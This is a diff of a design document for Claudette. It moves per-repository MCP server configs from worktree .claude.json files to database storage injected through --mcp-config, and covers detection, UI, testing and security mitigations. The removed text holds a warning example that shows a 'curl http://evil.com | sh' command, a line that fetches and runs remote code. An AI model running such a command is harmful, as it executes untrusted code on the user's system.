+#### Alternative 2: Symlink Repo `.claude.json` into Worktrees
 
-**Decision**: **Rejected** for initial implementation. Parsing config files directly is faster and more reliable. We can add CLI-based detection as a fallback or validation step later.
+**Approach**: Create symlink from `{worktree}/.claude.json` → `{repo}/.claude.json`.
 
-#### Alternative 2: Store MCP Configs in Database
+**Why Rejected**:
+- Only solves the gitignored repo config problem, not user project MCPs
+- Symlinks can cause unexpected behavior with Claude CLI
+- Doesn't allow per-repo customization of which MCPs to include
 
-**Approach**: Copy MCP configurations into Claudette's SQLite database.
+#### Alternative 3: Use `--strict-mcp-config` for Full Control
 
-**Pros**:
-- Faster querying (no file I/O on every workspace creation)
-- Can track MCP usage statistics per workspace
-- Offline-first (no need to read files)
+**Approach**: Use `--strict-mcp-config` to ignore all auto-detected MCPs, providing the full set explicitly.
 
-**Cons**:
-- Duplicates data (source of truth is `.claude.json` files)
-- Requires sync mechanism when files change externally
-- Database migrations needed for schema changes
-- Violates "config in files, not database" principle
-
-**Decision**: **Rejected**. Claudette already follows the pattern of reading `.claudette.json` on-demand. MCP configs should follow the same pattern. The database is for runtime state (workspaces, sessions), not configuration.
-
-#### Alternative 3: Read-Only MCP Display (No Workspace Config)
-
-**Approach**: Only show detected MCPs during workspace creation (informational), but don't write `.claude.json`.
-
-**Pros**:
-- Simpler implementation (no file writing)
-- No risk of corrupting `.claude.json` files
-- Fewer edge cases (merge conflicts, formatting)
-
-**Cons**:
-- Doesn't solve user's problem (can't customize MCP setup per workspace)
-- Limited value (user can already run `claude mcp list` manually)
-- Misses opportunity for workflow improvement
-
-**Decision**: **Rejected**. The core value proposition is enabling workspace-specific MCP configurations. Read-only display alone is insufficient.
+**Why Rejected**:
+- Would require detecting AND injecting `.mcp.json` contents (which are already auto-available)
+- Would require detecting global user MCPs (also already auto-available)
+- Much more config to maintain; higher chance of divergence from user's actual setup
+- Breaks the principle of minimal intervention
 
 ## Implementation Plan
 
-### Phase 1: Core MCP Detection (P0)
+### Phase 1: Detection + Storage (P0)
 
-**Goal**: Detect and display MCP servers during workspace creation.
-
-**Tasks**:
-1. Create `src/mcp.rs` module with:
-   - `McpServer`, `McpServerConfig`, `McpScope` types
-   - `detect_mcp_servers()` function
-   - `parse_mcp_config()` helper
-   - Unit tests for parsing various config formats
-2. Add Tauri command `detect_mcp_servers` in `src-tauri/src/commands/mcp.rs`
-3. Create `McpSelectionModal.tsx` component with:
-   - MCP server list display
-   - Loading/error states
-   - Skip/Cancel functionality (no configuration yet)
-4. Integrate modal into workspace creation flow in `Sidebar.tsx`
-5. Add frontend service function in `src/ui/src/services/mcp.ts`
-
-**Acceptance Criteria**:
-- [ ] MCP detection works for all three scopes (user, project, local)
-- [ ] Modal displays server name, type, and scope
-- [ ] Handles missing/malformed config files gracefully
-- [ ] Unit tests pass for various config formats
-- [ ] UI shows loading state during detection
-
-**Estimated Complexity**: Medium
-
-### Phase 2: Workspace MCP Configuration (P0)
-
-**Goal**: Write selected MCP configs to workspace `.claude.json`.
+**Goal**: Detect non-portable MCPs and store selections in the database.
 
 **Tasks**:
-1. Implement `write_workspace_mcp_config()` in `src/mcp.rs`:
-   - Read existing `.claude.json` (if present)
-   - Merge `mcpServers` section
-   - Write formatted JSON
-   - Handle file I/O errors
-2. Add Tauri command `configure_workspace_mcps`
-3. Update `McpSelectionModal.tsx`:
-   - Add checkbox selection UI
-   - Wire up "Configure Selected Servers" button
-   - Show success/error toasts
-4. Test end-to-end flow:
-   - Create workspace
-   - Select MCP servers
-   - Verify `.claude.json` written correctly
-   - Verify Claude agent can read config
+1. Create `src/mcp.rs` module:
+   - `McpServer`, `McpSource` types
+   - `detect_mcp_servers()` — scans `~/.claude.json` project MCPs and gitignored repo `.claude.json`
+   - `serialize_for_cli()` — formats for `--mcp-config`
+   - `is_tracked_by_git()` helper
+   - Unit tests
+2. Add database migration v15:
+   - `repository_mcp_servers` table
+   - CRUD functions in `db.rs`
+3. Add Tauri commands in `src-tauri/src/commands/mcp.rs`:
+   - `detect_mcp_servers`
+   - `save_repository_mcps`
+   - `load_repository_mcps`
+   - `delete_repository_mcp`
+4. Register commands in `main.rs` invoke handler
 
 **Acceptance Criteria**:
-- [ ] Selected MCP configs written to worktree `.claude.json`
-- [ ] Existing `.claude.json` content preserved (merge, not overwrite)
-- [ ] JSON validation prevents malformed files
-- [ ] UI shows clear error messages on failure
-- [ ] Claude CLI can read written `.claude.json` (`claude mcp list` shows servers)
+- [ ] Detection finds project-scoped MCPs in `~/.claude.json`
+- [ ] Detection finds MCPs in gitignored `{repo}/.claude.json`
+- [ ] Detection ignores `.mcp.json` and global (non-project) MCPs
+- [ ] Detection ignores tracked `.claude.json` (not gitignored)
+- [ ] Database CRUD works for MCP server storage
+- [ ] Unit tests pass for all parsing and edge cases
 
-**Estimated Complexity**: Medium
+### Phase 2: Selection UI (P0)
 
-### Phase 3: MCP Management UI (P1)
-
-**Goal**: View/edit MCP configuration for existing workspace.
+**Goal**: Present MCP selection modal in the add-repo flow.
 
 **Tasks**:
-1. Create workspace settings modal (if doesn't exist) or add MCP tab
-2. Add `read_workspace_mcps` Tauri command
-3. Display workspace-specific MCP servers
-4. Show inherited servers (read-only)
-5. Implement add/remove MCP server functionality
-6. Add "Test MCP Server" button (validates connectivity)
+1. Create `McpSelectionModal.tsx`:
+   - Server list with checkboxes (pre-selected)
+   - Transport type and source labels
+   - Loading/empty/error states
+   - Skip and Save actions
+2. Add frontend service functions (`services/mcp.ts`)
+3. Add TypeScript types (`types/mcp.ts`)
+4. Integrate into `AddRepoModal.tsx`:
+   - After `add_repository()` succeeds, call `detect_mcp_servers()`
+   - If servers found, open `McpSelectionModal`
+   - If no servers found, proceed normally
+5. Add `mcpSelection` case to `ModalRouter.tsx`
 
 **Acceptance Criteria**:
-- [ ] User can view all MCP servers for a workspace (workspace + inherited)
-- [ ] User can add/remove MCP servers from workspace config
-- [ ] Changes persist to `.claude.json` immediately
-- [ ] UI indicates which servers are inherited vs. workspace-specific
+- [ ] Modal shows after adding a repo with non-portable MCPs
+- [ ] Modal does NOT show when no non-portable MCPs exist
+- [ ] All detected servers pre-selected by default
+- [ ] Skip closes modal without saving
+- [ ] Save persists selections to database
+- [ ] UI handles loading and error states
 
-**Estimated Complexity**: High (depends on workspace settings modal implementation)
+### Phase 3: Agent Injection (P0)
 
-### Phase 4: Advanced Features (P2)
-
-**Goal**: Polish and advanced MCP workflows.
+**Goal**: Inject stored MCPs at agent spawn time via `--mcp-config`.
 
 **Tasks**:
-1. Environment variable expansion in UI (show resolved values)
-2. Sensitive value masking (API keys, tokens)
-3. MCP server templates (common configurations)
-4. Import MCP server from URL/JSON snippet
-5. Export workspace MCP config for sharing
-6. MCP server health check (test connection)
+1. Add `mcp_config: Option<String>` to `AgentSettings`
+2. Update `build_claude_args()` to append `--mcp-config` on first turn
+3. Update `send_chat_message` to load MCPs from DB and pass to `AgentSettings`
+4. Add `serialize_for_cli()` call in the command layer
+5. End-to-end test: add repo → select MCPs → create workspace → chat → verify MCPs available
 
 **Acceptance Criteria**:
-- [ ] Env vars display resolved values (e.g., `$HOME` → `/home/user`)
-- [ ] Sensitive values masked in UI (show `***` instead of tokens)
-- [ ] Users can select from MCP server templates
-- [ ] Import/export works for individual servers and full configs
+- [ ] First turn includes `--mcp-config <json>` in CLI args
+- [ ] Resumed turns do NOT include `--mcp-config` (session inherits)
+- [ ] Repos with no saved MCPs spawn without `--mcp-config`
+- [ ] `serialize_for_cli()` produces valid JSON accepted by Claude CLI
+- [ ] Agent can use injected MCP tools
 
-**Estimated Complexity**: High
+### Phase 4: Settings Management (P1)
+
+**Goal**: Manage MCP selections for existing repos in settings UI.
+
+**Tasks**:
+1. Add MCP section to repository settings modal
+2. Display saved MCP servers with name, type, source
+3. Add "Re-detect" button to scan for new/changed MCPs
+4. Add remove button per server
+5. Wire up to existing `update_repository_settings` flow or dedicated save
+
+**Acceptance Criteria**:
+- [ ] Saved MCPs visible in repo settings
+- [ ] Re-detect finds newly added MCPs
+- [ ] Removing a server updates DB immediately
+- [ ] Changes reflected in next agent spawn
 
 ## Testing Strategy
 
-### Unit Tests
+### Unit Tests (`src/mcp.rs`)
 
-**Backend (`src/mcp.rs`)**:
-- Parse valid `.claude.json` with stdio, http, and sse servers
-- Parse `.mcp.json` with project-scoped servers
-- Handle missing config files (return empty list)
-- Handle malformed JSON (return error)
-- Handle invalid server configs (skip with warning)
-- Merge configs from multiple scopes with correct precedence
-- Write MCP config to new `.claude.json`
-- Merge MCP config into existing `.claude.json`
-- Preserve non-MCP fields in `.claude.json`
-
-**Frontend (`McpSelectionModal.test.tsx`)**:
-- Render loading state during detection
-- Render MCP server list with correct data
-- Handle detection errors gracefully
-- Allow selecting/deselecting servers
-- Disable "Configure" button when no servers selected
-- Call `configure_workspace_mcps` with correct arguments
+| Test Case | Input | Expected Output |
+|-----------|-------|-----------------|
+| User project MCPs found | `~/.claude.json` with `projects[path].mcpServers` | Vec of McpServer with `UserProjectConfig` source |
+| No project entry | `~/.claude.json` without matching project key | Empty Vec |
+| Gitignored `.claude.json` | Untracked `.claude.json` with `mcpServers` | Vec of McpServer with `RepoLocalConfig` source |
+| Tracked `.claude.json` | Git-tracked `.claude.json` with `mcpServers` | Empty Vec (skipped) |
+| Missing `~/.claude.json` | File doesn't exist | Empty Vec |
+| Malformed JSON | Invalid JSON in config file | Empty Vec (graceful fallback) |
+| No `mcpServers` key | Valid JSON without MCP section | Empty Vec |
+| Mixed sources | MCPs from both user config and repo config | Combined Vec with correct sources |
+| `serialize_for_cli` | Vec of McpServers | Valid JSON string with `mcpServers` wrapper |
+| Name collision across sources | Same server name in both sources | Both included (user can deselect one) |
 
 ### Integration Tests
 
-1. **End-to-End Workspace Creation**:
-   - Create workspace with MCP selection
-   - Verify `.claude.json` written to worktree
-   - Spawn Claude agent in workspace
-   - Verify agent can access MCP tools
-
-2. **Config File Scenarios**:
-   - User has global MCPs, no project MCPs
-   - Project has `.mcp.json`, no user MCPs
-   - Project has both `.mcp.json` and `.claude.json` (test precedence)
-   - No MCP configs anywhere (empty list)
-
-3. **Error Scenarios**:
-   - Worktree directory is read-only (write fails)
-   - `.claude.json` exists but is malformed (merge fails)
-   - Workspace deleted during MCP configuration
+1. **Database round-trip**: Insert MCPs → list → verify match
+2. **Delete cascade**: Delete repo → verify MCPs removed
+3. **Agent args**: Build args with mcp_config → verify `--mcp-config` present
+4. **Agent args (resume)**: Build args for resumed turn → verify no `--mcp-config`
+5. **Agent args (no MCPs)**: Build args with no mcp_config → verify no `--mcp-config`
 
 ### Manual Testing
 
-**Test Cases**:
-1. Install MCP server globally via `claude mcp add`, verify it appears in Claudette
-2. Create `.mcp.json` in project, verify project-scoped servers appear
-3. Create workspace, select MCPs, verify `.claude.json` written correctly
-4. Create workspace, skip MCP selection, verify no `.claude.json` created
-5. Edit `.claude.json` manually, verify changes reflected in UI
-6. Delete `.claude.json` in workspace, verify inherited servers still shown
+1. Add repo that has project-scoped MCPs in `~/.claude.json` → verify modal shows
+2. Add repo with no non-portable MCPs → verify modal does NOT show
+3. Add repo with gitignored `.claude.json` containing MCPs → verify detection
+4. Select MCPs → create workspace → send message → verify `claude mcp list` shows servers
+5. Skip MCPs → verify agent spawns without `--mcp-config`
+6. Open repo settings → verify saved MCPs displayed
+7. Remove an MCP from settings → verify next agent session doesn't include it
 
 ## Edge Cases and Error Handling
 
-### Edge Case 1: Workspace Creation Fails After MCP Selection
+### Edge Case 1: Large `~/.claude.json`
 
-**Scenario**: User selects MCPs, modal writes `.claude.json`, but workspace creation fails (e.g., git worktree error).
+**Scenario**: User has a very large `~/.claude.json` with many projects.
 
-**Handling**:
-- **Option A** (Recommended): Write `.claude.json` AFTER workspace creation succeeds
-  - Pro: No orphaned config files
-  - Con: Extra step in creation flow
-- **Option B**: Write `.claude.json` before workspace creation
-  - Pro: Simpler flow
-  - Con: May leave orphaned `.claude.json` in worktree if creation fails
+**Handling**: Parse only the relevant project key. `serde_json::Value` handles large files efficiently. If parsing fails, return empty Vec and log warning.
 
-**Decision**: Option A. Write `.claude.json` only after workspace is created and persisted to database.
+### Edge Case 2: Duplicate Server Names Across Sources
 
-### Edge Case 2: `.claude.json` Exists with Non-MCP Content
+**Scenario**: Same MCP server name appears in both `~/.claude.json` project config and gitignored `.claude.json`.
 
-**Scenario**: Workspace already has `.claude.json` with custom instructions or other settings.
+**Handling**: Show both in the selection modal with different source labels. User decides which to keep. If both are saved, `--mcp-config` will include both — Claude CLI uses the last one seen (effectively the one listed later in the JSON).
 
-**Handling**:
-- Parse existing file as JSON
-- Preserve all fields except `mcpServers`
-- Merge/replace `mcpServers` section
-- Pretty-print with 2-space indentation (match Claude CLI format)
+### Edge Case 3: Repository Path Changes
 
-**Example**:
+**Scenario**: User moves the repository directory. The project key in `~/.claude.json` no longer matches.
 
-Before:
-```json
-{
-  "customInstructions": "Always use TypeScript",
-  "mcpServers": {
-    "old-server": { "type": "stdio", "command": "old" }
-  }
-}
-```
+**Handling**: Stored MCPs in the database remain valid (they're self-contained configs). "Re-detect" in settings will use the new canonical path. Old project-keyed MCPs won't be found, but the DB-stored versions still work.
 
-After (user selects "new-server", removes "old-server"):
-```json
-{
-  "customInstructions": "Always use TypeScript",
-  "mcpServers": {
-    "new-server": { "type": "http", "url": "https://..." }
-  }
-}
-```
+### Edge Case 4: `~/.claude.json` Not Valid JSON
 
-### Edge Case 3: MCP Server with Environment Variables
+**Scenario**: File exists but contains invalid JSON.
 
-**Scenario**: MCP config includes `${API_KEY}` in env/headers, but variable is not set.
+**Handling**: `serde_json::from_str` returns `Err`, we convert to `None` via `.ok()`, return empty Vec. No error shown to user since this isn't a critical failure.
 
-**Handling**:
-- Display raw variable syntax in UI (e.g., `${API_KEY}`)
-- Optionally show resolved value if variable is set (e.g., `${API_KEY}` → `sk-abc***`)
-- When writing to `.claude.json`, preserve variable syntax (don't resolve)
-- Claude CLI will resolve at runtime
+### Edge Case 5: MCP Server Config with Environment Variables
 
-**UI**:
-```
-Server: github-api
-Type: http
-URL: https://api.github.com/mcp
-Headers:
-  Authorization: Bearer ${GITHUB_TOKEN}  [resolved: ghp_abc***]
-```
+**Scenario**: Config contains `${API_KEY}` or `${VAR:-default}` syntax.
 
-### Edge Case 4: Conflicting MCP Server Names Across Scopes
+**Handling**: Store the raw config including variable references. Claude CLI resolves these at runtime. Display raw syntax in UI (e.g., `${API_KEY}`). Do not attempt to resolve variables in Claudette.
 
-**Scenario**: User has `filesystem` server in `~/.claude.json`, and project has different `filesystem` server in `.mcp.json`.
+### Edge Case 6: Agent Session Started Before MCPs Configured
 
-**Handling**:
-- Show both servers in UI with scope indicator:
-  ```
-  ☐ filesystem (stdio, user)
-  ☐ filesystem (http, project)  ← higher precedence
-  ```
-- When user selects project-scoped server, write it to workspace `.claude.json` (overrides user-scoped)
-- Clarify precedence in UI tooltip: "This server will override the user-scoped server with the same name"
+**Scenario**: User adds repo, skips MCP selection, creates workspace and starts chatting. Later configures MCPs in repo settings.
 
-### Edge Case 5: Permission Errors Writing `.claude.json`
-
-**Scenario**: Worktree directory is read-only or user lacks write permissions.
-
-**Handling**:
-- Catch file I/O error in `write_workspace_mcp_config()`
-- Return descriptive error: "Failed to write .claude.json: Permission denied"
-- Display error toast in UI
-- Log full error to console/logs for debugging
-- Allow user to retry or skip
+**Handling**: Changes only apply to new sessions. The current session (already initialized with `--session-id`) cannot retroactively gain MCP access. User must start a new session (e.g., new workspace or reset session) for MCPs to take effect.
 
 ## Security Considerations
 
-### S1: Sensitive Data Exposure
+### S1: Sensitive Values in MCP Configs
 
-**Risk**: MCP configs may contain API keys, tokens, or credentials in `env`, `headers`, or `oauth` fields.
-
-**Mitigation**:
-- Mask sensitive values in UI (show `***` after first 3 characters)
-- Do not log MCP configs to console or files
-- Warn users before writing sensitive values to workspace `.claude.json` (shared via git)
-- Recommend using environment variables instead of hardcoded secrets
-
-**Example**:
-```
-env:
-  API_KEY: sk-ant-api03-abc***  (masked)
-  DATABASE_URL: postgres://user:pass***@localhost/db
-```
-
-### S2: JSON Injection
-
-**Risk**: Maliciously crafted `.claude.json` or `.mcp.json` could exploit JSON parser vulnerabilities.
+**Risk**: Config may contain API keys, tokens, or credentials in `env`, `headers`, or `url` fields.
 
 **Mitigation**:
-- Use battle-tested JSON parser (`serde_json` in Rust)
-- Validate the expected MCP schema, especially the shape of `mcpServers` and nested server definitions
-- For `.claude.json`, allow and preserve unknown/non-MCP root-level fields (for example `customInstructions`); only reject invalid or unexpected structure within the MCP-specific sections being read or written
-- Sanitize error messages (don't include file content in user-facing errors)
+- Mask values in the selection UI that look like secrets (length > 20, contains mix of alphanumeric chars)
+- Store configs as-is in DB (needed for `--mcp-config` injection) — DB file is local and user-owned
+- Never log full MCP configs; log only server names
+- Environment variable references (`${VAR}`) are preferred over inline secrets
 
-### S3: Path Traversal
+### S2: JSON Injection via Config
 
-**Risk**: Attacker could craft `worktree_path` to write `.claude.json` outside workspace directory.
-
-**Mitigation**:
-- Validate `worktree_path` is a subdirectory of repository root
-- Use `canonicalize()` to resolve symlinks and `..` components
-- Reject paths outside repository boundary
-- Log security violations for monitoring
-
-**Example**:
-```rust
-let canonical_worktree = worktree_path.canonicalize()
-    .map_err(|_| "Invalid worktree path")?;
-let canonical_repo = repo_path.canonicalize()
-    .map_err(|_| "Invalid repository path")?;
-
-if !canonical_worktree.starts_with(&canonical_repo) {
-    return Err("Worktree path is outside repository".to_string());
-}
-```
-
-### S4: Command Injection (Stdio MCP Servers)
-
-**Risk**: Stdio MCP configs include `command` and `args` that could be exploited if user copies untrusted configs.
+**Risk**: Maliciously crafted config JSON could cause issues when passed to `--mcp-config`.
 
 **Mitigation**:
-- Display warning when copying stdio servers from untrusted sources
-- Show full command in UI before writing to `.claude.json`
-- Do not execute MCP commands in Claudette (only Claude CLI does)
-- Recommend reviewing configs before selecting
+- Validate that `config_json` stored in DB is valid JSON via `serde_json::from_str`
+- Use `serde_json::to_string` for serialization (handles escaping)
+- The JSON is passed as a single CLI argument (shell-escaped by `Command::arg()`)
 
-**UI Warning**:
-```
-⚠ This MCP server runs a command on your system:
-  Command: bash -c "curl http://evil.com | sh"
+### S3: Git Command Injection
 
-Only add MCP servers from trusted sources.
-[Cancel] [I Understand, Add Server]
-```
+**Risk**: The `is_tracked_by_git()` helper runs `git ls-files`. A crafted filename could inject commands.
+
+**Mitigation**:
+- The filename is hardcoded (`.claude.json`), not user-provided
+- Use `Command::args()` (array form), not shell string interpolation
+- `current_dir` is the validated repo path from database
 
 ## Open Questions
 
-### Q1: Should we validate MCP server connectivity?
+### Q1: Should we detect MCPs from `~/.claude/plugins/`?
 
-**Question**: When user selects an MCP server, should we test if it's reachable/functional before writing to `.claude.json`?
+**Question**: Claude Code's plugin system stores MCP configs in `~/.claude/plugins/`. Should we detect these?
 
-**Pros**:
-- Prevents broken configs
-- Better UX (immediate feedback)
+**Recommendation**: No. Plugin MCPs are globally available to Claude CLI regardless of working directory. They don't need injection.
 
-**Cons**:
-- Adds latency to workspace creation
-- Stdio servers may fail without proper working directory/env
-- HTTP servers may require authentication
+### Q2: Should MCP selections be workspace-level instead of repo-level?
 
-**Recommendation**: Add as optional feature in Phase 4 ("Test MCP Server" button in settings UI). Don't block workspace creation on validation.
+**Question**: Different workspaces might need different MCPs. Should we allow per-workspace overrides?
 
-### Q2: Should we parse `.claude.json` for non-MCP settings?
+**Recommendation**: Start with repo-level (simpler, covers 90% of cases). If users need per-workspace MCPs, add an override table later. The `--mcp-config` injection point in `send_chat_message` can easily be extended to check workspace-level overrides first.
 
-**Question**: `.claude.json` can contain other settings like `customInstructions`, `allowedTools`, etc. Should we display/manage these in Claudette?
+### Q3: What if the user modifies `~/.claude.json` after adding the repo?
 
-**Scope Creep Risk**: High. This expands the feature significantly.
+**Question**: Should we watch for changes and prompt to re-detect?
 
-**Recommendation**: Phase 1-2 should only handle `mcpServers` section. Preserve other fields but don't display/edit them. Future enhancement can add full `.claude.json` editor.
+**Recommendation**: No automated watching. Provide a "Re-detect" button in repo settings. File watching adds complexity and edge cases (debouncing, race conditions) for a rare scenario.
 
-### Q3: How to handle MCP server name conflicts?
+### Q4: Should we support adding custom MCP servers not from detection?
 
-**Question**: If user selects MCP server with same name as existing workspace server, should we:
-1. Overwrite (replace existing)
-2. Rename (append `-2`, `-3`, etc.)
-3. Block (show error)
+**Question**: Should users be able to manually add MCP configs that don't exist in any config file?
 
-**Recommendation**: Option 1 (overwrite) with clear UI indication: "This will replace the existing 'filesystem' server in workspace config."
-
-### Q4: Should we support `.mcp.json` writing?
-
-**Question**: Should Claudette allow creating/editing `.mcp.json` (project-scoped) in addition to `.claude.json` (local-scoped)?
-
-**Consideration**: `.mcp.json` is typically shared via git. Claudette would need to handle git status, conflicts, etc.
-
-**Recommendation**: Phase 1-2 should only write to workspace-specific `.claude.json` (local scope, not shared). Project-scoped `.mcp.json` management is out of scope for initial implementation.
-
-### Q5: What if `~/.claude.json` doesn't exist?
-
-**Question**: Some users may not have global Claude config. Should we create it if needed?
-
-**Recommendation**: No. Only read `~/.claude.json` if it exists. Don't create or modify user's global config. Claudette should only manage workspace-local `.claude.json` files.
+**Recommendation**: Defer to Phase 4+. The initial implementation focuses on carrying existing configs into worktrees. Manual MCP management is a separate feature.
 
 ## Success Metrics
 
-### Primary Metrics
-
-1. **Adoption Rate**: % of workspace creations that use MCP selection (target: >30%)
-2. **Configuration Success Rate**: % of MCP configurations that succeed without errors (target: >95%)
-3. **Time to Configure**: Median time from workspace creation to first Claude agent turn with MCPs (target: <30 seconds)
-
-### Secondary Metrics
-
-4. **MCP Discovery Coverage**: % of users' MCP servers detected correctly (target: 100%)
-5. **Error Rate**: % of workspace creations that fail due to MCP config issues (target: <1%)
-6. **Support Tickets**: Reduction in MCP-related support requests (target: -50%)
-
-### User Satisfaction
-
-7. **User Feedback**: Positive sentiment on MCP feature (survey after 2 weeks)
-8. **Feature Usage**: % of users with >1 workspace using different MCP configs (indicates value)
-
-## Future Enhancements
-
-### FE1: MCP Server Marketplace
-
-**Description**: Curated list of popular MCP servers with one-click installation.
-
-**Features**:
-- Browse MCP servers by category (databases, APIs, tools)
-- Preview server capabilities (tools, resources, prompts)
-- One-click add to workspace
-- Community ratings and reviews
-
-### FE2: MCP Server Health Monitoring
-
-**Description**: Monitor MCP server availability and performance.
-
-**Features**:
-- Real-time status indicators (green/yellow/red)
-- Error logs for failed MCP calls
-- Performance metrics (latency, success rate)
-- Alerts for server downtime
-
-### FE3: MCP Configuration Templates
-
-**Description**: Pre-configured MCP setups for common workflows.
-
-**Features**:
-- Templates: "Web Development", "Data Analysis", "DevOps", etc.
-- Bundled MCP servers for each template
-- Customizable after applying template
-- Share templates with team via JSON export
-
-### FE4: Cross-Workspace MCP Sync
-
-**Description**: Sync MCP configuration across multiple workspaces.
-
-**Features**:
-- Mark MCP configs as "global" (apply to all workspaces in repo)
-- Bulk update (apply changes to N workspaces at once)
-- Conflict resolution UI
-- Dry-run mode (preview changes)
+1. **Detection accuracy**: 100% of non-portable MCPs correctly identified
+2. **Zero false positives**: Never detect MCPs that are already auto-available in worktrees
+3. **Injection success**: Agents can use injected MCP tools in 100% of cases
+4. **Minimal friction**: Modal only appears when there are MCPs to configure; skip takes one click
+5. **No regressions**: Auto-detected MCPs (`.mcp.json`, global user MCPs) continue to work without `--mcp-config`
 
 ## Appendix
 
-### A1: MCP Configuration Examples
+### A1: `--mcp-config` JSON Format
 
-**Stdio Server (Local File System)**:
+The JSON string passed to `--mcp-config` wraps server configs in an `mcpServers` object:
+
 ```json
 {
   "mcpServers": {
-    "filesystem": {
+    "my-server": {
       "type": "stdio",
       "command": "npx",
-      "args": ["-y", "@modelcontextprotocol/server-filesystem", "/home/user/projects"],
-      "env": {}
-    }
-  }
-}
-```
-
-**HTTP Server (Remote API)**:
-```json
-{
-  "mcpServers": {
-    "github": {
+      "args": ["-y", "@example/mcp-server"],
+      "env": { "API_KEY": "${MY_API_KEY}" }
+    },
+    "my-api": {
       "type": "http",
-      "url": "https://mcp.github.com/api",
+      "url": "https://mcp.example.com/api",
       "headers": {
-        "Authorization": "Bearer ${GITHUB_TOKEN}"
+        "Authorization": "Bearer ${TOKEN}"
       }
     }
   }
 }
 ```
 
-**SSE Server (Legacy)**:
+### A2: `~/.claude.json` Project-Scoped Structure
+
 ```json
 {
-  "mcpServers": {
-    "legacy-sse": {
-      "type": "sse",
-      "url": "https://old-mcp.example.com/sse"
+  "projects": {
+    "/home/user/my-repo": {
+      "mcpServers": {
+        "project-db": {
+          "command": "docker",
+          "args": ["exec", "postgres-mcp", "serve"],
+          "env": {}
+        }
+      },
+      "allowedTools": ["Bash", "Read"]
+    },
+    "/home/user/other-repo": {
+      "mcpServers": { ... }
     }
-  }
+  },
+  "numStartups": 42,
+  ...other user-level state...
 }
 ```
 
-### A2: Claude Code Precedence Example
+### A3: Database Schema
 
-**Scenario**:
-- User config (`~/.claude.json`): `filesystem` → `/home/user`
-- Project config (`.mcp.json`): `filesystem` → `/project/root`
-- Local config (`.claude.json`): `github` → `https://api.github.com`
+```sql
+CREATE TABLE repository_mcp_servers (
+    id              TEXT PRIMARY KEY,        -- UUID
+    repository_id   TEXT NOT NULL            -- FK to repositories.id
+        REFERENCES repositories(id) ON DELETE CASCADE,
+    name            TEXT NOT NULL,           -- MCP server name
+    config_json     TEXT NOT NULL,           -- Full server config as JSON
+    source          TEXT NOT NULL,           -- 'user_project_config' | 'repo_local_config'
+    created_at      TEXT NOT NULL DEFAULT (datetime('now')),
+    UNIQUE(repository_id, name)             -- One server per name per repo
+);
+```
 
-**Effective Configuration**:
-- `filesystem` server: Uses **project** scope → `/project/root` (local scope has highest precedence but does not define `filesystem`)
-- `github` server: Uses **local** scope → `https://api.github.com` (only defined here)
+### A4: References
 
-### A3: References
-
-- Claude Code MCP Documentation: https://code.claude.com/docs/en/mcp.md
+- Claude Code `--mcp-config` flag: `claude --help`
 - MCP Specification: https://modelcontextprotocol.io/
-- Claudette Architecture: `CLAUDE.md`, Issue #5, Issue #11
-- Relevant Claudette Files:
-  - `src/config.rs` (existing `.claudette.json` handling)
-  - `src/agent.rs` (agent spawning with working directory)
-  - `src-tauri/src/commands/workspace.rs` (workspace creation flow)
-  - `src/ui/src/components/modals/ConfirmSetupScriptModal.tsx` (similar modal UI)
+- Claudette Architecture: `CLAUDE.md`
+- Previous TDD (superseded): git history of this file
+- Related Issue: [#170](https://github.com/utensils/Claudette/issues/170)
+- Related PR (closed): [#174](https://github.com/utensils/Claudette/pull/174)
 
 ---
 
 **Next Steps**:
-1. Review this TDD with stakeholders
-2. Validate architecture and scope
-3. Prioritize phases (confirm P0/P1/P2)
-4. Assign implementation to sprint
-5. Create detailed GitHub issues for each phase
+1. Review this TDD
+2. Close PR #174 (previous approach)
+3. Implement Phase 1-3 (detection, UI, injection) as a single PR
+4. Phase 4 (settings management) as follow-up PR
